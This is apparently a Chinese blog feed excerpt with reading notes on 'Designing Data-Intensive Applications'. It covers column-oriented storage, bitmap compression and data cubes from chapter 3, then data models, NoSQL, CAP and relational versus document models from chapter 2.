<p>即使日期和时间通常使用维度表来表示，因为这允许对日期（诸如公共假期）的附加信息进行编码，从而允许查询区分假期和非假期的销售。</p>
<p><font color="orange"><strong>“星型模式” 这个名字来源于这样一个事实，即当表关系可视化时，事实表在中间，由维表包围；与这些表的连接就像星星的光芒。</strong></font></p>
<p>这个模板的变体被称为雪花模式，其中维度被进一步分解为子维度。例如，品牌和产品类别可能有单独的表格，并且 <code>dim_product</code> 表格中的每一行都可以将品牌和类别作为外键引用，而不是将它们作为字符串存储在 <code>dim_product</code> 表格中。雪花模式比星形模式更规范化，但是<strong>星形模式通常是首选，因为分析师使用它更简单【55】。</strong></p>
<p><font color="orange"><strong>在典型的数据仓库中，表格通常非常宽：事实表格通常有 100 列以上，有时甚至有数百列</strong></font>【51】。维度表也可以是非常宽的，因为它们包括可能与分析相关的所有元数据 —— 例如，<code>dim_store</code> 表可以包括在每个商店提供哪些服务的细节，它是否具有店内面包房，方形镜头，商店第一次开幕的日期，最后一次改造的时间，离最近的高速公路的距离等等。</p>
<h2 id="列存储"><strong>列存储</strong></h2>
<p>如果事实表中有万亿行和数 PB 的数据，那么高效地存储和查询它们就成为一个具有挑战性的问题。维度表通常要小得多（数百万行），所以在本节中我们将主要关注事实的存储。</p>
<p>尽管事实表通常超过 100 列，但典型的数据仓库查询一次只能访问 4 个或 5 个查询（ “ <code>SELECT *</code> ” 查询很少用于分析）【51】。以<a href="https://vonng.gitbooks.io/ddia-cn/content/ch3.html">例 3-1</a> 中的查询为例：它访问了大量的行（在 2013 日历年中每次都有人购买水果或糖果），但只需访问 <code>fact_sales</code> 表的三列：<code>date_key, product_sk, quantity</code>。查询忽略所有其他列。</p>
<p><strong>例 3-1 分析人们是否更倾向于购买新鲜水果或糖果，这取决于一周中的哪一天</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  dim_date.weekday,</span><br><span class="line">  dim_product.category,</span><br><span class="line">  <span class="built_in">SUM</span>(fact_sales.quantity) <span class="keyword">AS</span> quantity_sold</span><br><span class="line"><span class="keyword">FROM</span> fact_sales</span><br><span class="line">  <span class="keyword">JOIN</span> dim_date <span class="keyword">ON</span> fact_sales.date_key <span class="operator">=</span> dim_date.date_key</span><br><span class="line">  <span class="keyword">JOIN</span> dim_product <span class="keyword">ON</span> fact_sales.product_sk <span class="operator">=</span> dim_product.product_sk</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">  dim_date.year <span class="operator">=</span> <span class="number">2013</span> <span class="keyword">AND</span></span><br><span class="line">  dim_product.category <span class="keyword">IN</span> (<span class="string">'Fresh fruit'</span>, <span class="string">'Candy'</span>)</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">  dim_date.weekday, dim_product.category;</span><br></pre></td></tr></tbody></table></figure>
<p>在大多数 OLTP 数据库中，存储都是以面向行的方式进行布局的：表格的一行中的所有值都相邻存储。文档数据库是相似的：整个文档通常存储为一个连续的字节序列。</p>
<p>为了处理像例 3-1 这样的查询，您可能在 <code>fact_sales.date_key</code>， <code>fact_sales.product_sk</code> 上有索引，它们告诉存储引擎在哪里查找特定日期或特定产品的所有销售情况。但是，面向行的存储引擎仍然需要将所有这些行（每个包含超过 100 个属性）从磁盘加载到内存中，解析它们，并过滤掉那些不符合要求的条件。这可能需要很长时间。</p>
<p>面向列的存储背后的想法很简单：<font color="orange">不要将所有来自一行的值存储在一起，而是将来自每一列的所有值存储在一起</font>。如果每个列存储在一个单独的文件中，查询只需要读取和解析查询中使用的那些列，这可以节省大量的工作。这个原理如图 3-10 所示。</p>
<p><img src="fig3-10.png"></p>
<p>列存储在关系数据模型中是最容易理解的，但它同样适用于非关系数据。例如，Parquet 【57】是一种列式存储格式，支持基于 Google 的 Dremel 【54】的文档数据模型。</p>
<p>面向列的存储布局依赖于包含相同顺序行的每个列文件。 因此，如果您需要重新组装整行，您可以从每个单独的列文件中获取第 23 项，并将它们放在一起形成表的第 23 行。</p>
<h3 id="列压缩"><strong>列压缩</strong></h3>
<p>除了仅从磁盘加载查询所需的列以外，我们还可以通过压缩数据来进一步降低对磁盘吞吐量的需求。幸运的是，面向列的存储通常很适合压缩。</p>
<p>看看图 3-10 中每一列的值序列：它们通常看起来是相当重复的，这是压缩的好兆头。根据列中的数据，可以使用不同的压缩技术。在数据仓库中特别有效的一种技术是位图编码，如<a href="https://vonng.gitbooks.io/ddia-cn/content/img/fig3-11.png">图 3-11</a> 所示。</p>
<p><img src="fig3-11.png"></p>
<p><strong>图 3-11 压缩位图索引存储布局</strong></p>
<p>通常情况下，一列中不同值的数量与行数相比较小（例如，零售商可能有数十亿的销售交易，但只有 100,000 个不同的产品）。现在我们可以得到一个有 n 个不同值的列，并把它转换成 n 个独立的位图：每个不同值的一个位图，每行一位。如果该行具有该值，则该位为 1 ，否则为 0 。</p>
<p>如果 n 非常小（例如，国家 / 地区列可能有大约 200 个不同的值），则这些位图可以每行存储一位。但是，如果 n 更大，大部分位图中将会有很多的零（我们说它们是稀疏的）。在这种情况下，位图可以另外进行游程编码（<a href="https://en.wikipedia.org/wiki/Run-length_encoding">Run-length encoding - Wikipedia</a>），如<a href="https://vonng.gitbooks.io/ddia-cn/content/fig3-11.png">图 3-11</a> 底部所示。这可以使列的编码非常紧凑。</p>
<p>这些位图索引非常适合数据仓库中常见的各种查询。例如：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> product_sk <span class="keyword">IN</span>（<span class="number">30</span>，<span class="number">68</span>，<span class="number">69</span>）</span><br></pre></td></tr></tbody></table></figure>
<p>加载 <code>product_sk = 30</code> , <code>product_sk = 68</code> , <code>product_sk = 69</code> 的三个位图，并计算三个位图的按位或，这可以非常有效地完成。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> product_sk <span class="operator">=</span> <span class="number">31</span> <span class="keyword">AND</span> store_sk <span class="operator">=</span> <span class="number">3</span></span><br></pre></td></tr></tbody></table></figure>
<p>加载 <code>product_sk = 31</code> 和 <code>store_sk = 3</code> 的位图，并逐位计算 AND。 这是因为列按照相同的顺序包含行，因此一列的位图中的第 k 位对应于与另一列的位图中的第 k 位相同的行。</p>
<h4 id="内存带宽和向量处理"><strong>内存带宽和向量处理</strong></h4>
<p>对于需要扫描数百万行的数据仓库查询来说，一个巨大的瓶颈是从磁盘获取数据到内存的带宽。但是，这不是唯一的瓶颈。分析数据库的开发人员也担心有效利用主存储器带宽到 CPU 缓存中的带宽，避免 CPU 指令处理流水线中的分支错误预测和气泡，以及在现代中使用单指令多数据（SIMD）指令 CPU 【59,60】。</p>
<p>除了减少需要从磁盘加载的数据量以外，面向列的存储布局也可以有效利用 CPU 周期。例如，查询引擎可以将大量压缩的列数据放在 CPU 的 L1 缓存中，然后在紧密的循环中循环（即没有函数调用）。一个 CPU 可以执行这样一个循环比代码要快得多，这个代码需要处理每个记录的大量函数调用和条件。列压缩允许列中的更多行适合相同数量的 L1 缓存。前面描述的按位 “与” 和 “或” 运算符可以被设计为直接在这样的压缩列数据块上操作。这种技术被称为矢量化处理【58,49】。</p>
<h3 id="列存储中的排序顺序"><strong>列存储中的排序顺序</strong></h3>
<p>在列存储中，存储行的顺序并不一定很重要。按插入顺序存储它们是最简单的，因为插入一个新行就意味着附加到每个列文件。但也可以选择强制执行一个排序，就像我们之前对 SSTables 所做的那样，并将其用作索引机制。</p>
<p>只有我们知道一列中的第 k 项与另一列中的第 k 项属于同一行，才能重建一行。因此，即使按列存储数据，也需要一次对整行进行排序。</p>
<p>数据库的管理员可以凭借他们对常见查询模式的了解来选择表中应该被排序的列。例如，如果查询通常以日期范围为目标，例如上个月，则可以将 <code>date_key</code> 作为第一个排序键。然后，查询优化器只能扫描上个月的行，这比扫描所有行要快得多。</p>
<p>第二列可以确定第一列中具有相同值的任何行的排序顺序。例如，如果 <code>date_key</code> 是<a href="https://vonng.gitbooks.io/ddia-cn/content/img/fig3-10.png">图 3-10</a> 中的第一个排序关键字，那么 <code>product_sk</code> 可能是第二个排序关键字，因此同一天的同一产品的所有销售都将在存储中组合在一起。这将有助于需要在特定日期范围内对交易按产品维度进行分组或过滤的查询。</p>
<p>排序的另一个好处是它可以帮助压缩列。如果主要排序列没有多个不同的值，那么在排序之后，它将具有很长的序列，其中相同的值连续重复多次。一个简单的运行长度编码（就像我们用于<a href="https://vonng.gitbooks.io/ddia-cn/content/img/fig3-11.png">图 3-11</a> 中的位图一样）可以将该列压缩到几千字节 —— 即使表中有数十亿行。</p>
<p>第一个排序键的压缩效果最强。第二和第三个排序键会更混乱，因此不会有这么长时间的重复值。排序优先级下面的列以基本上随机的顺序出现，所以它们可能不会被压缩。但整体而言，将前几个列进行排序与压缩仍是一种胜利。</p>
<h4 id="几个不同的排序顺序"><strong>几个不同的排序顺序</strong></h4>
<p>这个想法的巧妙扩展在 C-Store 中引入，并在商业数据仓库 Vertica【61,62】中被采用。<font color="orange">不同的查询受益于不同的排序顺序，以不同同的顺序存储相同的数据，以便在处理查询时，可以使用最适合查询模式的版本。</font>无论如何，数据总需要复制到多台机器（replicas）以避免单点故障、数据丢失。</p>
<p>在一个面向列的存储中，有多个排序顺序有点类似于在一个面向行的存储中有多个二级索引。但最大的区别在于面向行的存储将每一行保存在一个地方（在堆文件或聚簇索引中），二级索引只包含指向匹配行的指针。在列存储中，通常在其他地方没有任何指向数据的指针，只有包含值的列。</p>
<h3 id="写入列存储"><strong>写入列存储</strong></h3>
<p>OLAP 的大多数负载由分析人员运行的大型只读查询组成。面向列的存储，压缩和排序都有助于更快地读取这些查询。然而，他们都会使写更困难。</p>
<p><font color="orange">B 树的就地更新方法不适用于压缩列</font>。如果你想在排序表的中间插入一行，你很可能不得不重写所有的列文件。由于行由列中的位置标识，因此插入必须始终更新所有列。</p>
<p>LSM 树是很好的解决方案：所有的写操作首先进入一个内存中的存储，在这里它们被添加到一个已排序的结构中，并准备写入磁盘。内存中的存储是面向行还是列的，这并不重要。当已经积累了足够的写入数据时，它们将与磁盘上的列文件合并，并批量写入新文件。这基本上是 Vertica 所做的【62】。</p>
<p>查询需要检查磁盘上的列数据和最近在内存中的写入，并将两者结合起来。但是，查询优化器隐藏了用户的这个区别。从分析师的角度来看，通过插入，更新或删除操作进行修改的数据会立即反映在后续查询中。</p>
<h3 id="聚合数据立方体和物化视图"><strong>聚合：数据立方体和物化视图</strong></h3>
<p>并不是每个数据仓库都必定是一个列存储：传统的面向行的数据库和其他一些架构也被使用。然而，对于专门的分析查询，列式存储可以显著加快，所以它正在迅速普及【51,63】。</p>
<p>数据仓库的另一个值得一提的是物化汇总。如前所述，数据仓库查询通常涉及一个聚合函数，如 SQL 中的 COUNT，SUM，AVG，MIN 或 MAX。如果相同的聚合被许多不同的查询使用，那么每次都可以通过原始数据来处理。为什么不缓存一些查询使用最频繁的计数或总和？</p>
<p>创建这种缓存的一种方式是物化视图。在关系数据模型中，它通常被定义为一个标准（虚拟）视图：一个类似于表的对象，其内容是一些查询的结果。不同的是，物化视图是查询结果的实际副本，写入磁盘，而虚拟视图只是写入查询的捷径。从虚拟视图读取时，SQL 引擎会将其展开到视图的底层查询中，然后处理展开的查询。</p>
<p>当底层数据发生变化时，物化视图需要更新，因为它是数据的非规范化副本。数据库可以自动完成，但是这样的更新使得写入成本更高，这就是在 OLTP 数据库中不经常使用物化视图的原因。在读取繁重的数据仓库中，它们可能更有意义（不管它们是否实际上改善了读取性能取决于个别情况）。</p>
<p>物化视图的常见特例称为数据立方体或 OLAP 立方【64】。它是按不同维度分组的聚合网格。<a href="https://vonng.gitbooks.io/ddia-cn/content/img/fig3-12.png">图 3-12</a> 显示了一个例子。</p>
<p><img src="fig3-12.png"></p>
<p><strong>图 3-12 数据立方的两个维度，通过求和聚合</strong></p>
<p>想象一下，现在每个事实都只有两个维度表的外键 —— 在<a href="https://vonng.gitbooks.io/ddia-cn/content/img/fig-3-12.png">图 3-12</a> 中，这些是日期和产品。您现在可以绘制一个二维表格，一个轴线上的日期和另一个轴上的产品。每个单元包含具有该日期 - 产品组合的所有事实的属性（例如，<code>net_price</code>）的聚集（例如，<code>SUM</code>）。然后，您可以沿着每行或每列应用相同的汇总，并获得一个维度减少的汇总（按产品的销售额，无论日期，还是按日期销售，无论产品如何）。</p>
<p>一般来说，事实往往有两个以上的维度。在图 3-9 中有五个维度：日期，产品，商店，促销和客户。要想象一个五维超立方体是什么样子是很困难的，但是原理是一样的：每个单元格都包含特定日期（产品 - 商店 - 促销 - 客户）组合的销售。这些值可以在每个维度上重复概括。</p>
<p>物化数据立方体的优点是某些查询变得非常快，因为它们已经被有效地预先计算了。例如，如果您想知道每个商店的总销售额，则只需查看合适维度的总计，无需扫描数百万行。</p>
<p>缺点是数据立方体不具有查询原始数据的灵活性。例如，没有办法计算哪个销售比例来自成本超过 100 美元的项目，因为价格不是其中的一个维度。<font color="orange">因此，大多数数据仓库试图保留尽可能多的原始数据，并将聚合数据（如数据立方体）仅用作某些查询的性能提升。</font></p>
<h2 id="总结">总结</h2>
<p>在本章中，我们试图深入了解数据库是如何处理存储和检索的。将数据存储在数据库中会发生什么？稍后再次查询数据时数据库会做什么？</p>
<p>在高层次上，我们看到存储引擎分为两大类：针对 <strong>事务处理（OLTP）</strong> 优化的存储引擎和针对 <strong>在线分析（OLAP）</strong> 优化的存储引擎。这两类使用场景的访问模式之间有很大的区别：</p>
<ul>
<li>OLTP 系统通常面向最终用户，这意味着系统可能会收到大量的请求。为了处理负载，应用程序在每个查询中通常只访问少量的记录。应用程序使用某种键来请求记录，存储引擎使用索引来查找所请求的键的数据。硬盘查找时间往往是这里的瓶颈。</li>
<li>数据仓库和类似的分析系统会少见一些，因为它们主要由业务分析人员使用，而不是最终用户。它们的查询量要比 OLTP 系统少得多，但通常每个查询开销高昂，需要在短时间内扫描数百万条记录。硬盘带宽（而不是查找时间）往往是瓶颈，列式存储是针对这种工作负载的日益流行的解决方案。</li>
</ul>
<p>在 OLTP 这一边，我们能看到两派主流的存储引擎：</p>
<ul>
<li>日志结构学派：只允许追加到文件和删除过时的文件，但不会更新已经写入的文件。Bitcask、SSTables、LSM 树、LevelDB、Cassandra、HBase、Lucene 等都属于这个类别。</li>
<li>就地更新学派：将硬盘视为一组可以覆写的固定大小的页面。 B 树是这种理念的典范，用在所有主要的关系数据库和许多非关系型数据库中。</li>
</ul>
<p>日志结构的存储引擎是相对较新的技术。他们的主要想法是，通过系统性地将随机访问写入转换为硬盘上的顺序写入，由于硬盘驱动器和固态硬盘的性能特点，可以实现更高的写入吞吐量。</p>
<p>关于 OLTP，我们最后还介绍了一些更复杂的索引结构，以及针对所有数据都放在内存里而优化的数据库。</p>
<p>然后，我们暂时放下了存储引擎的内部细节，查看了典型数据仓库的高级架构，并说明了为什么分析工作负载与 OLTP 差别很大：当你的查询需要在大量行中顺序扫描时，索引的重要性就会降低很多。相反，非常紧凑地编码数据变得非常重要，以最大限度地减少查询需要从硬盘读取的数据量。我们讨论了列式存储如何帮助实现这一目标。</p>
<h3 id="参考">参考</h3>
<p><a href="http://ddia.vonng.com/#/ch3?id=事务处理还是分析？">第三章：存储与检索 (vonng.com)</a></p>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第二章：数据模型与查询语言</title>
    <url>/blog/2024/04/09/DDIA-Note-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文是 DDIA 的第二章，介绍了常用的数据模型和查询语言。</p>
<span id="more"></span>
<p>笔者是阅读的英语原文，感觉能够有更深的理解和思考，不过阅读时间也会成倍增加，也会去发散地了解一些书中一笔带过的知识，补充在博客中。</p>
<p>根据维基百科的定义，数据模型是一种抽象模型，用于组织数据元素，标准化数据元素之间及与现实实体属性之间的关系。例如，数据模型可以指定一个汽车元素由许多其他数据元素组成，包含大小、颜色、所有者等。</p>
<p>多数应用使用层层叠加的数据模型构建。对于每层数据模型的关键问题是：它是如何用低一层数据模型来<strong>表示</strong>的？例如，一个应用中，从高到低的数据模型：</p>
<ul>
<li><strong>应用层</strong>：采用合适的数据结构，对业务对象进行表示（人员、货物、行为等）</li>
<li><strong>模型层</strong>：选取存储数据结构的数据模型，例如 JSON、XML</li>
<li><strong>DB 层</strong>：数据库系统底层通过内存、磁盘、网络上的字节，表示数据模型，提供 CRUD 操作</li>
<li><strong>硬件层</strong>：硬件存储：电流、光脉冲信号等</li>
</ul>
<p>一个复杂的应用程序可能会有更多的中间层次，比如基于 API 的 API，不过基本思想仍然是一样的：<strong>每个层都通过提供一个明确的数据模型来隐藏更低层次中的复杂性</strong>。这些抽象允许不同的人群有效地协作（例如数据库厂商的工程师和使用数据库的应用程序开发人员）。</p>
<p>现在最著名的数据模型可能是 SQL。它基于 Edgar Codd 在 1970 年提出的关系模型。关系模型是<strong>采用二维表格结构表达实体类型及实体间联系的数据模型</strong>。数据被组织为关系，关系是元组（行）的集合。</p>
<p>今天在网上看到的大部分内容依旧是由关系数据库来提供支持，无论是在线发布，讨论，社交网络，电子商务，游戏，软件即服务生产力应用程序等等内容。</p>
<h2 id="nosql">NoSQL</h2>
<h3 id="概念">概念</h3>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/NoSQL">NoSQL - Wikipedia</a></p>
</blockquote>
<ul>
<li> 通常指代 non-SQL，或者 non-relational。也被解释为 Not-Only SQL，用于强调在单一系统中使用多种数据存储，来满足变化的数据存取需求（<a href="https://en.wikipedia.org/wiki/Polyglot_persistence">polyglot-persistent</a>）</li>
<li>常用数据结构：KV 键值对、列存储、图、文档</li>
</ul>
<h3 id="cap理论">CAP 理论</h3>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/CAP_theorem">CAP theorem - Wikipedia</a></p>
</blockquote>
<p>CAP 理论：NoSQL 牺牲一致性，保证可用性和分区容错，和更好的性能</p>
<ul>
<li>一致性（Consistency）：每次读取要么返回最新的写，要么返回错误</li>
<li>可用性（Availability）：每个请求返回非错响应，并不保证是最新的写</li>
<li>分区容错（Partition tolerance）：即使出现了任意的丢包或延迟，系统也可以持续工作</li>
<li> CAP 至多取其二，如果一个请求出现了网络分区问题，系统必须选择：
<ul>
<li>丢弃该操作，影响可用性</li>
<li>继续操作，威胁一致性</li>
</ul></li>
</ul>
<h3 id="base一致性模型">BASE 一致性模型</h3>
<p>放弃 ACID 强一致性，提供 BASE 一致性模型，参见 <a href="https://en.wikipedia.org/wiki/Eventual_consistency">Eventual consistency</a>：</p>
<ul>
<li>基础可用性（Basically Available）：读取和写入操作尽可能可用（使用数据库集群的所有节点），但可能不一致（冲突协调后写入可能不会持续，读取可能不会获得最新的写入）</li>
<li>软状态（Soft state）：没有一致性保证，一段时间后，我们只有一定的概率知道状态，因为它可能还没有收敛</li>
<li>最终一致性（<strong>Eventually consistent</strong>）：分布式计算中用于实现高可用性的一致性模型，它非正式地保证，如果没有对给定数据项进行新的更新，最终对该项的所有访问都将返回最后更新的值。</li>
<li>ACID 有酸的意思，BASE 有碱的意思，二者酸碱不容</li>
</ul>
<h3 id="选择nosql的原因">选择 NoSQL 的原因</h3>
<ul>
<li>易于扩展：例如 KV 存储比关系存储更容易分布式部署，水平扩容</li>
<li>开源和免费</li>
<li>对特定查询支持的更好</li>
<li>提供动态、更具表现力的模型</li>
</ul>
<p>然而 NoSQL 也有一些不足，一致性弱、对 join 支持差等。不同的应用有不同的数据存取需要，最优的技术选型也不能一概而论。但可预见的是，关系模型会与非关系模型继续共存。</p>
<h2 id="对象关系不匹配">对象关系不匹配</h2>
<h3 id="概念-1">概念</h3>
<ul>
<li>多数应用是使用面向对象的概念编程，SQL 以关系存储模型</li>
<li>需要一个尴尬的中间层，完成二者之间的转换</li>
<li>这个问题也被称为阻抗不匹配（<a href="https://en.wikipedia.org/wiki/Object–relational_impedance_mismatch">Object–relational impedance mismatch</a>）</li>
<li>对象关系映射（Object-relational mapping，ORM）框架，例如 ActiveRecord、Hibernate 减少了转换层的模板代码开销，但还是不能掩盖二者的差异</li>
</ul>
<h3 id="一对多">一对多</h3>
<p>一个例子是，使用关系模型存储一份如下的简历：</p>
<p><img src="fig2-1.png"></p>
<p>唯一标识符是 user_id，对于 first_name、last_name 这种唯一字段，可以建模为 user 表的列</p>
<p>而对于教育、职位等存在多个值的信息，通常有三种方式：</p>
<ul>
<li>旧版 SQL，建立多张表，使用外键关联，如图上那样</li>
<li>使用 JSON、XML 等格式，存储单个字段</li>
<li>使用 JSON、XML 等格式，存储所有职位、教育等信息</li>
</ul>
<p>虽然都可以达到存取效果，但是：</p>
<ul>
<li>多表存储，就会导致查询时的多次查询或者复杂多表联合</li>
<li>一个字段存储符合值，违背了第一范式，也不利于细粒度的读取和检索</li>
</ul>
<p>这就是阻抗不匹配的一个典型例子。如果是使用 JSON 存储整个简历的话：</p>
<ul>
<li>更好的局部性：一次就可以读出所有的简历数据</li>
<li>灵活性：简历里可以灵活增删字段；关系模型中列的更改会导致全表修改，代价很大</li>
</ul>
<p>这种阻抗不匹配，是因为简历中暗含了一个树结构，即一对多的关系，JSON 能更直观地表现这种结构。</p>
<figure>
<img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/b0dc37a1-060f-40cf-8c3e-1e2dd030f600/309b61de-da88-4b64-9fa0-8abca9b4c41d/Untitled.png" alt="Untitled"><figcaption aria-hidden="true">Untitled</figcaption>
</figure>
<h2 id="多对一和多对多">多对一和多对多</h2>
<p>上面的简历中，地区（region）和行业（industry）以 id 的形式关联 user，而非字符串。这种方式有如下优点：</p>
<ul>
<li>一致的风格和拼写</li>
<li>避免重名歧义</li>
<li>易于更新：对人类有意义的字符串只存储在一处，其他地方引用的都是对人类无意义的 id
<ul>
<li>相反，如果存储在多处时，如果需要更新就有写传播的开销，而且威胁一致性</li>
</ul></li>
<li>本地化支持：翻译多国语言</li>
<li>更好地搜索：region_id 对应的 region 可能标准化存储了国家、州等信息，可以方便搜索一个地区内部的某些简历</li>
</ul>
<h3 id="多对一">多对一</h3>
<p>移除数据存储的冗余，例如将字符串多存储集中为存储到一处的过程，称为标准化（normalization）。</p>
<p>标准化地区、行业这种数据需要多对一关系：很多人可能生活在同一个地区、从事同一种行业。这不是很适用文档模型。</p>
<ul>
<li>在关系模型里，引用其他表的 id 是很常见的，外键</li>
<li>文档模型对 join 通常较弱，因为这在一对多关系中并不需要</li>
</ul>
<p>使用文档模型的应用，可能会在业务层做 join 操作。例如在内存里维护 id→字符串的映射，即使这种数据可能长时间不会变更，这也在业务层引入了额外的开销。</p>
<h3 id="多对多">多对多</h3>
<p>即使初始版本能够适配无 join 的文档模型，随着业务的发展和新特性的加入，数据趋向于变得越来越关联，例如简历要实现以下功能：</p>
<ul>
<li>组织和学校作为实体，而非普通的字符串</li>
<li>用户可以给其他人的简历填写推荐语，推荐人的照片、姓名会一并展示出来</li>
</ul>
<p>上面两种都是多对多关系</p>
<p><img src="fig2-2.png"></p>
<h2 id="文档模型是否在重蹈覆辙">文档模型是否在重蹈覆辙？</h2>
<p>多对多、join 的争论，并不是起于文档模型和 NoSQL，要更早。</p>
<p>1970s，最著名的数据库是 IBM 的信息管理系统（Information Management System，IMS），它使用层次模型，类似 JSON 的树状结构，能够处理一对多关系，但不能很好地处理多对多，不支持 join。</p>
<p>为了改进层次模型的缺陷，出现了：</p>
<ul>
<li>关系模型：SQL 统治世界</li>
<li>网络模型：声名鹊起，到默默无闻</li>
</ul>
<h3 id="网络模型">网络模型</h3>
<p>由 Conference on Data Systems Languages 委员会提出，也被称为（CODASYL）模型</p>
<p>是层次模型的推广：</p>
<ul>
<li>每条记录可以有多个父节点
<ul>
<li>比如 region 记录”Greater Seattle Area”，所有居住在这个 region 的人都会指向这个节点</li>
</ul></li>
<li>以磁盘指针实现指向关联，而非外键</li>
<li>访问记录的唯一方法，是从根记录开始沿着一条访问路径（access path），移动游标（curosr）
<ul>
<li>最简单的情况下，访问路径类似遍历链表，从首元素开始，逐个遍历直到找到目标元素</li>
<li>但在多对多关系下，不同路径可能会指向同样的记录，程序员必须追踪所有访问路径，类似 N 维空间遍历</li>
</ul></li>
</ul>
<p>缺点：</p>
<ul>
<li>手动编写的访问路径，虽然可以高效利用有限的硬件资源，但也使得查询和更新非常复杂且不灵活</li>
<li>想要对数据模型进行变更也是困难的</li>
</ul>
<h3 id="关系模型">关系模型</h3>
<p>很简单，关系就是一张表，元组的集合：</p>
<ul>
<li>没有复杂的嵌套结构</li>
<li>没有复杂的访问路径，使用声明式的查询 SQL</li>
<li> 通用的查询优化器（query optimizer）自动地对查询进行优化
<ul>
<li>相当于在自动搜索 “访问路径”</li>
<li> 添加新特征很容易：新建了索引，优化器就会自动评估是否使用该索引</li>
</ul></li>
</ul>
<p>查询优化器很复杂，吸收了多年的科研和工业界的成果。但是核心在于，只需要构建一次通用的查询优化器，所有的关系查询都可以从中受益。</p>
<ul>
<li>短期来看，手动调制优化的代码会更容易</li>
<li>长远来看，通用的优化器一定是更胜一筹的</li>
</ul>
<h3 id="与文档模型比较">与文档模型比较</h3>
<p>文档模型 vs 层次模型</p>
<ul>
<li>如果文档模型在父节点中存储嵌套记录（一对多关系），而不是单独的表，就会退化为层次模型，例如 positions、educations。</li>
<li>目前为止，文档模型还没有走层次模型的老路</li>
</ul>
<p>文档模型 vs 关系模型</p>
<ul>
<li>当处理多对一、多对多关系上，关系模型和文档模型并无本质不同，都是依赖于类似外键的唯一标识符，在读取时通过 join 或多次查询实现。</li>
</ul>
<h2 id="关系模型vs文档模型">关系模型 vs 文档模型</h2>
<p>先不讨论并发、故障恢复，只关注数据模型</p>
<p>文档模型优点：</p>
<ul>
<li>模型（schema）灵活</li>
<li>局部性更好，减少查询 join 次数</li>
<li>贴近应用对象，阻抗不匹配问题小</li>
</ul>
<p>关系模型优点：</p>
<ul>
<li>良好的 join 支持</li>
<li>支持多对一、多对多关系</li>
</ul>
<h3 id="哪种模型下代码更简单">哪种模型下代码更简单</h3>
<p>取决于业务特点</p>
<p>如果应用存在树形的文档结构，类似简历，选择文档模型可能是个好主意。对比之下，关系模型会按范式把数据拆分多份，再做连接拼接，比较笨重。</p>
<p>文档模型的缺陷：</p>
<ul>
<li>不能直接访问文档的元素，需要编写访问路径，如果不是太深，也问题不大</li>
<li>不支持连接。
<ul>
<li>这可能会成为问题，也可能不会，取决于应用特点。例如，如果只是用一个文档模型记录时间 - 事件的分析型应用，可能永远用不到多对多关系。</li>
</ul></li>
</ul>
<p>然而，如果应用需要多对多关系，文档模型的吸引力会小很多。</p>
<ul>
<li>虽然可以通过反标准化（denormalization）来避免 join，但是业务也需要额外成本维护一致性</li>
<li>多次查询模拟的 join，会比数据系统里精心实现的性能差很多（毕竟有查询优化大杀器在）</li>
</ul>
<p>结论：对于高度关联的数据：</p>
<ul>
<li>文档模型是糟糕的</li>
<li>关系模型是可接受的</li>
<li>图模型是最自然的</li>
</ul>
<h3 id="文档模型的模式灵活性">文档模型的模式灵活性</h3>
<p>文档模型 / 关系模型支持的 JSON，通常不会强制约束数据的模型（schema），关系模型支持的 XML 可能提供可选的模式验证。没有强制的模式，意味着文档模型读取时可能读取到任意的键值。</p>
<ul>
<li>有时被称为无模式（schemaless），但并不恰当</li>
<li>更准确的叫法为读时模式（schema-on-read）：数据的模式是隐含的，在读取时被解释
<ul>
<li>类似编程的动态类型检查</li>
</ul></li>
<li>与之对应的是写时模式（schema-on-write）：数据的模式是显式的，在写入时验证，如关系数据库
<ul>
<li>类似编程的静态类型检查</li>
</ul></li>
</ul>
<p>读时模式和写时模式各有优劣，如同动态 vs 静态类型检查争论已久。二者的区别在于：</p>
<ul>
<li>在模式需要发生变更时、或者元素的模式不一时，文档模型更加灵活。</li>
<li>在元素的模式统一时，模式可以提供使用的强制结构检查。</li>
</ul>
<p>虽然关系数据库可以通过 Alter table 变更模式，一般在毫秒级完成。但是 Mysql 是个例外，Alter table 会拷贝整张表，可能导致数秒到分钟级的不可用</p>
<h3 id="查询的局部性">查询的局部性</h3>
<p>文档模型的每次文档读都需要全量读取，写通常需要全量覆盖（除非文档大小不变，可以就地修改），因此适用于：</p>
<ul>
<li>每次需要访问文档中的大部分内容</li>
<li>大文档的修改少；或者将大文档拆分为多个小文档，减少写成本</li>
</ul>
<p>这些性能上的限制减少了文档模型的适用场景。查询的局部性也并非文档模型的专属，谷歌的 Spanner 数据库，Oracle 也有一些提高局部性的机制。</p>
<h3 id="互相融合">互相融合</h3>
<p>大多数关系数据库，已经支持了 XML、JSON 这样的文档格式。另一方面，文档数据库 RethinkDB 支持了关系 join，MongoDB 支持了数据引用。</p>
<p>关系模型和文档模型的互相融合，使得开发人员可以结合二者的优势。</p>
<h2 id="数据查询语言">数据查询语言</h2>
<p>可以分为声明式、命令式两类。</p>
<table>
<colgroup>
<col style="width: 32%">
<col style="width: 33%">
<col style="width: 33%">
</colgroup>
<thead>
<tr class="header">
<th></th>
<th>声明式（Declarative）</th>
<th>命令式（Imperative）</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>简介</td>
<td>只声明想要的查询模式，不强制执行策略，由计算机自主选择合适的策略获取数据。</td>
<td>告诉计算机实现操作的特定流程和顺序，命令计算机逐行执行代码，完成操作。</td>
</tr>
<tr class="even">
<td>例子</td>
<td> SQL：只声明数据的条件（where）和数据转换（sort、group）等，由查询优化器决定如何实现查询。</td>
<td>IMS、CODASYL：手动编写显式的 Access Path 实现查询</td>
</tr>
<tr class="odd">
<td>优点</td>
<td>查询模式简单准确、可读性好</td>
<td></td>
